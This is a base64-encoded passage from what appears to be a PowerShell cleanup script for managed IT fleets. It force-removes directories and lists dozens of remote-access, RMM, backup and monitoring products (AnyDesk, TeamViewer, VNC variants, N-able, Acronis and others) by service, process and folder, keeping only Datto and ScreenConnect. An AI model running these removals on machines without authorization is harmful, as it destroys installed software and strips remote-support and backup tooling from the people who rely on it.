TmFtZQogICAgICAgICAgICAgICAgaWYgKElzLUtlZXBlciAkZCkgeyByZXR1cm4gfQogICAgICAg
ICAgICAgICAgaWYgKEZvcmNlLVJlbW92ZURpciAkZCkgeyAkbi5kaXIrKzsgTG9nICJkaXJfcmVt
b3ZlZCAkZCIgfQogICAgICAgICAgICAgICAgZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJkaXJfUkVN
T1ZFX0ZBSUxFRCAkZCIgfQogICAgICAgICAgICB9CiAgICB9CgogICAgIyA1LiBkaXNhbGxvd2Vk
IFJNTSAvIHJlbW90ZS1hY2Nlc3MgdG9vbHMgKG1hcmtldCBjb3ZlcmFnZSAyMDI2KS4KICAgICMg
S0VFUCBmb3JldmVyOiBEYXR0by9DZW50cmFTdGFnZSArIFNjcmVlbkNvbm5lY3Qga2VlcCBGUHMg
KGhhbmRsZWQgYWJvdmUpLgogICAgIyBORVZFUiBwdXQgRGF0dG8vQ2VudHJhU3RhZ2UvQ2FnU2Vy
dmljZSBpbiB0aGlzIGxpc3QuCiAgICBmdW5jdGlvbiBJcy1EYXR0b0tlZXBlcihbc3RyaW5nXSRz
KSB7CiAgICAgICAgaWYgKC1ub3QgJHMpIHsgcmV0dXJuICRmYWxzZSB9CiAgICAgICAgcmV0dXJu
IFtib29sXSgkcyAtbWF0Y2ggJyg/aSlEYXR0b3xDZW50cmFTdGFnZXxDYWdTZXJ2aWNlfEF1dG90
YXNrRW5kcG9pbnQnKQogICAgfQogICAgJHJtbSA9IEAoCiAgICAgICAgQHsgVGFnPSdBbnlEZXNr
JzsgICAgICBTdmM9QCgnQW55RGVzaycpOyBQcm9jPUAoJ0FueURlc2snKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xBbnlEZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFueURlc2si
LCIkZW52OlByb2dyYW1EYXRhXEFueURlc2siKTsgUHJvZD1AKCdBbnlEZXNrKicpIH0KICAgICAg
ICBAeyBUYWc9J1RlYW1WaWV3ZXInOyAgIFN2Yz1AKCdUZWFtVmlld2VyKicpOyBQcm9jPUAoJ1Rl
YW1WaWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xUZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJv
ZD1AKCdUZWFtVmlld2VyKicpIH0KICAgICAgICBAeyBUYWc9J1NwbGFzaHRvcCc7ICAgIFN2Yz1A
KCdTcGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRv
cConLCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XFNwbGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1A
KCdTcGxhc2h0b3AqJykgfQogICAgICAgIEB7IFRhZz0nTG9nTWVJbic7ICAgICAgU3ZjPUAoJ0xv
Z01lSW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWlnbml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbion
LCdMTUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xM
b2dNZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dN
ZUluKicpIH0KICAgICAgICBAeyBUYWc9J0dvVG8nOyAgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyon
LCdHb1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9B
c3Npc3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XEdvVG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgn
R29Ub015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvIFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywn
R29UbyBDb25uZWN0KicpIH0KICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdS
dXN0RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNr
Iik7IFByb2Q9QCgnUnVzdERlc2sqJykgfQogICAgICAgIEB7IFRhZz0nU3VwcmVtbyc7ICAgICAg
U3ZjPUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3VwcmVtbyonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJv
ZD1AKCdTdXByZW1vKicpIH0KICAgICAgICBAeyBUYWc9J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdE
V0FnZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRl
bnY6UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNlKicp
IH0KICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pv
aG9NZWV0aW5nKicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
Wm9ob01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lzdConLCdab2hvTWVldGluZyonKSB9CiAg
ICAgICAgQHsgVGFnPSdSZW1vdGVQQyc7ICAgICBTdmM9QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgn
UmVtb3RlUEMqJywnUlBDU3VpdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVtb3Rl
UEMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVtb3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQ
QyonKSB9CiAgICAgICAgQHsgVGFnPSdCb21nYXInOyAgICAgICBTdmM9QCgnYm9tZ2FyKicsJ0Jl
eW9uZFRydXN0KicpOyBQcm9jPUAoJ2JvbWdhcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xCb21nYXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFt
RmlsZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1c3Qi
KTsgUHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1c3QqJykgfQogICAgICAgIEB7IFRhZz0nUGFy
c2VjJzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3BzZXJ2aWNl
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRhXFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNl
YyonKSB9CiAgICAgICAgQHsgVGFnPSdDaHJvbWVSRCc7ICAgICBTdmM9QCgnY2hyb21vdGluZyon
KTsgUHJvYz1AKCdyZW1vdGluZ19ob3N0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdv
b2dsZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29v
Z2xlXENocm9tZSBSZW1vdGUgRGVza3RvcCIpOyBQcm9kPUAoJ0Nocm9tZSBSZW1vdGUgRGVza3Rv
cConKSB9CiAgICAgICAgQHsgVGFnPSdVbHRyYVZOQyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52
bmMqJyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcVWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1A
KCdVbHRyYVZOQyonLCdXaW5WTkMqJykgfQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAgICAg
U3ZjPUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZudmlld2VyKicpOyBE
aXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGlnaHRWTkMqJykgfQogICAgICAgIEB7IFRhZz0nUmVh
bFZOQyc7ICAgICAgU3ZjPUAoJ3ZuY3NlcnZlcionKTsgUHJvYz1AKCd2bmNzZXJ2ZXIqJywndm5j
dmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlYWxWTkMiLCIke2VudjpQcm9n
cmFtRmlsZXMoeDg2KX1cUmVhbFZOQyIpOyBQcm9kPUAoJ1ZOQyBTZXJ2ZXIqJywnUmVhbFZOQyon
KSB9CiAgICAgICAgQHsgVGFnPSdEYW1lV2FyZSc7ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFBy
b2M9QCgnRFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdhcmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFt
RmlsZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTb2xhcldpbmRzIiwi
JGVudjpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2FyZSon
KSB9CiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0JzsgICBTdmM9QCgnTmV0U3VwcG9ydConKTsg
UHJvYz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
TmV0U3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9
QCgnTmV0U3VwcG9ydConKSB9CiAgICAgICAgQHsgVGFnPSdTaW1wbGVIZWxwJzsgICBTdmM9QCgn
U2ltcGxlSGVscConKTsgUHJvYz1AKCdTaW1wbGVTZXJ2aWNlKicsJ3NpbXBsZXNlcnZpY2UqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU2ltcGxlSGVscCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxTaW1wbGVIZWxwIik7IFByb2Q9QCgnU2ltcGxlSGVscConKSB9CiAgICAgICAgQHsg
VGFnPSdHZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVl
bionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHZXRTY3JlZW4iLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9QCgnR2V0U2NyZWVuKicpIH0KICAgICAgICBA
eyBUYWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQcm9jPUAoJ0lwZXJpdXNS
ZW1vdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSXBlcml1cyBSZW1vdGUiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cSXBlcml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicp
IH0KICAgICAgICBAeyBUYWc9J0lTTE9ubGluZSc7ICAgU3ZjPUAoJ0lTTGxpZ2h0KicpOyBQcm9j
PUAoJ0lTTGxpZ2h0KicsJ0lTTEFsd2F5c09uKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XElTTCBPbmxpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSVNMIE9ubGluZSIpOyBQcm9k
PUAoJ0lTTCBMaWdodConLCdJU0wgQWx3YXlzT24qJykgfQogICAgICAgIEB7IFRhZz0nQW1teXkn
OyAgICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9jPUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFtbXl5Iik7IFBy
b2Q9QCgnQW1teXkqJykgfQogICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAoJ1Vs
dHJhVmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFVsdHJhVmlld2Vy
Iik7IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykgfQogICAgICAgIEB7IFRhZz0nQWVyb0FkbWluJzsg
ICAgU3ZjPUAoJ0Flcm9BZG1pbionKTsgUHJvYz1AKCdBZXJvQWRtaW4qJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcQWVyb0FkbWluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFlcm9B
ZG1pbiIpOyBQcm9kPUAoJ0Flcm9BZG1pbionKSB9CiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdl
cic7ICBTdmM9QCgnTGl0ZU1hbmFnZXIqJyk7IFByb2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdl
cionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMaXRlTWFuYWdlciIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQcm9kPUAoJ0xpdGVNYW5hZ2VyKicpIH0KICAg
ICAgICBAeyBUYWc9J1JhZG1pbic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNl
cnZlcjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJhZG1pbiBTZXJ2
ZXIgMyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSYWRtaW4gU2VydmVyIDMiKTsgUHJvZD1A
KCdSYWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0nTm9NYWNoaW5lJzsgICAgU3ZjPUAoJ254c2Vy
dmVyKicsJ254ZConKTsgUHJvYz1AKCdueGQqJywnbnhzZXJ2ZXIqJywnbnhydW5uZXIqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTm9NYWNoaW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XE5vTWFjaGluZSIpOyBQcm9kPUAoJ05vTWFjaGluZSonKSB9CiAgICAgICAgQHsgVGFnPSdO
aW5qYU9uZSc7ICAgICBTdmM9QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1N
KicpOyBQcm9jPUAoJ05pbmphUk1NQWdlbnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcTmluamFSTU1BZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5q
YVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFt
RmlsZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJv
ZD1AKCdOaW5qYVJNTSonLCdOaW5qYU9uZSonKSB9CiAgICAgICAgQHsgVGFnPSdBdGVyYSc7ICAg
ICAgICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAoJ0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcQVRFUkEgTmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2
KX1cQVRFUkEgTmV0d29ya3MiLCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFBy
b2Q9QCgnQXRlcmEqJykgfQogICAgICAgIEB7IFRhZz0nQ29ubmVjdFdpc2UnOyAgU3ZjPUAoJ0xU
U2VydmljZScsJ0xUU3ZjTW9uJyk7IFByb2M9QCgnTFRTdmMqJywnTFRUcmF5KicpOyBEaXJzPUAo
IiRlbnY6d2luZGlyXExUU3ZjIiwiJGVudjpQcm9ncmFtRmlsZXNcTGFiVGVjaCBDbGllbnQiLCIk
e2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTGFiVGVjaCBDbGllbnQiKTsgUHJvZD1AKCdDb25uZWN0
V2lzZSBBdXRvbWF0ZSonLCdDb25uZWN0V2lzZSBSTU0qJywnTGFiVGVjaConKSB9CiAgICAgICAg
QHsgVGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgnQWdlbnRNb24nLCdLYXNleWEqJywnS0FBRFMq
Jyk7IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlhKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXEthc2V5YSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdL
YXNleWEgVlNBKicsJ0thc2V5YSBBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAg
ICAgICBTdmM9QCgnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRy
YWwqJyk7IFByb2M9QCgnRmlsZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVz
XE4tYWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRl
Y2hub2xvZ2llcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cTVNQQSBGaWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdl
bnQqJywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJvbConLCdT
b2xhcldpbmRzIE1TUConKSB9CiAgICAgICAgQHsgVGFnPSdTeW5jcm8nOyAgICAgICBTdmM9QCgn
U3luY3JvKicsJ0thYnV0byonKTsgUHJvYz1AKCdTeW5jcm8qJywnS2FidXRvKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXFJlcGFpclRlY2giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
UmVwYWlyVGVjaCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFN5bmNybyIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxTeW5jcm8iLCIkZW52OlByb2dyYW1EYXRhXFN5bmNybyIpOyBQcm9kPUAoJ1N5bmNy
byonLCdLYWJ1dG8qJywnUmVwYWlyVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7
ICAgICBTdmM9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JN
Z3IqJywnUENNb25pdG9yTWFuYWdlcionLCdQdWxzZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dy
YW1GaWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQdWxzZXdheSIsIiRl
bnY6UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUEMg
TW9uaXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJykgfQogICAgICAgIEB7
IFRhZz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVyT3BzKicpOyBQcm9jPUAoJ1N1cGVyT3Bz
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XFN1cGVyT3BzIiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAo
J1N1cGVyT3BzKicpIH0KICAgICAgICBAeyBUYWc9J0xldmVsJzsgICAgICAgIFN2Yz1AKCdMZXZl
bConKTsgUHJvYz1AKCdsZXZlbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZlbCIsIiRlbnY6UHJvZ3JhbURhdGFcTGV2ZWwi
KTsgUHJvZD1AKCdMZXZlbConKSB9CiAgICAgICAgQHsgVGFnPSdBY3Rpb24xJzsgICAgICBTdmM9
QCgnQWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24xKicsJ2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxB
Y3Rpb24xIiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rpb24xIik7IFByb2Q9QCgnQWN0aW9uMSonKSB9
CiAgICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgnTWFuYWdlRW5naW5lKicsJ1VF
TVMqJywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5hZ2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1T
KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dy
YW1GaWxlcyh4ODYpfVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVN
UyonLCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2VudHJhbCon
KSB9CiAgICAgICAgQHsgVGFnPSdUYWN0aWNhbFJNTSc7ICBTdmM9QCgndGFjdGljYWxybW0qJywn
TWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcpOyBQcm9jPUAoJ3RhY3RpY2Fscm1tKicsJ21lc2hhZ2Vu
dConLCdNZXNoQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGFjdGljYWxBZ2Vu
dCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUYWN0aWNhbEFnZW50IiwiJGVudjpQcm9ncmFt
RmlsZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7
IFByb2Q9QCgnVGFjdGljYWwqJywnTWVzaCBBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAg
ICAgQHsgVGFnPSdNZXNoQ2VudHJhbCc7ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcs
J01lc2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGly
cz1AKCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4
Nil9XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicsJ01lc2hDZW50cmFsKicpIH0K
ICAgICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKicsJ0NvbnRpbnV1bSon
KTsgUHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxl
c1xTQUFaT0QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFt
RmlsZXNcQ29udGludXVtIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQ
cm9kPUAoJ0NvbnRpbnV1bSonLCdTQUFaKicpIH0KICAgICAgICBAeyBUYWc9J05hdmVyaXNrJzsg
ICAgIFN2Yz1AKCdOYXZlcmlzayonKTsgUHJvYz1AKCdOYXZlcmlzayonKTsgRGlycz1AKCIkZW52
OlByb2dyYW1GaWxlc1xOYXZlcmlzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOYXZlcmlz
ayIpOyBQcm9kPUAoJ05hdmVyaXNrKicpIH0KICAgICAgICBAeyBUYWc9J0ltbXlCb3QnOyAgICAg
IFN2Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFByb2M9QCgnSW1teUFnZW50KicsJ0ltbXlCb3Qq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSW1teUJvdCIsIiR7ZW52OlByb2dyYW1GaWxl
cyh4ODYpfVxJbW15Qm90IiwiJGVudjpQcm9ncmFtRGF0YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1t
eUJvdConKSB9CiAgICAgICAgQHsgVGFnPSdBdXRvbW94JzsgICAgICBTdmM9QCgnYW1hZ2VudCon
LCdBdXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcQXV0b21veCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9n
cmFtRGF0YVxhbWFnZW50Iik7IFByb2Q9QCgnQXV0b21veConKSB9CiAgICAgICAgQHsgVGFnPSdB
Y3JvbmlzQ3liZXInOyBTdmM9QCgnQWNyb25pcyonKTsgUHJvYz1AKCdhY3JvY21kKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEFjcm9uaXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
QWNyb25pcyIpOyBQcm9kPUAoJ0Fjcm9uaXMgQ3liZXIqJywnQWNyb25pcyBBZ2VudConLCdDeWJl
ciBQcm90ZWN0IEFnZW50KicpIH0KICAgICAgICBAeyBUYWc9J0RvbW90eic7ICAgICAgIFN2Yz1A
KCdEb21vdHoqJyk7IFByb2M9QCgnRG9tb3R6KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XERvbW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21v
dHoqJykgfQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAgICAgICAgU3ZjPUAoJ0F1dmlrKicpOyBQ
cm9jPUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6
UHJvZ3JhbUZpbGVzKHg4Nil9XEF1dmlrIik7IFByb2Q9QCgnQXV2aWsqJykgfQogICAgICAgIEB7
IFRhZz0nQmFycmFjdWRhUk1NJzsgU3ZjPUAoJ0JhcnJhY3VkYSonKTsgUHJvYz1AKCdNV1NlcnZp
Y2UqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQmFycmFjdWRhIiwiJHtlbnY6UHJvZ3Jh
bUZpbGVzKHg4Nil9XEJhcnJhY3VkYSIsIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIFBsYXRmb3Jt
cyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZlbCBQbGF0Zm9ybXMiKTsgUHJvZD1AKCdC
YXJyYWN1ZGEgUk1NKicsJ01hbmFnZWQgV29ya3BsYWNlKicpIH0KICAgICAgICBAeyBUYWc9J0dv
dmVybGFuJzsgICAgIFN2Yz1AKCdHb3ZlcmxhbionKTsgUHJvYz1AKCdnb3ZlcmxhbionLCdnb3Zh
Z2VudConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dy
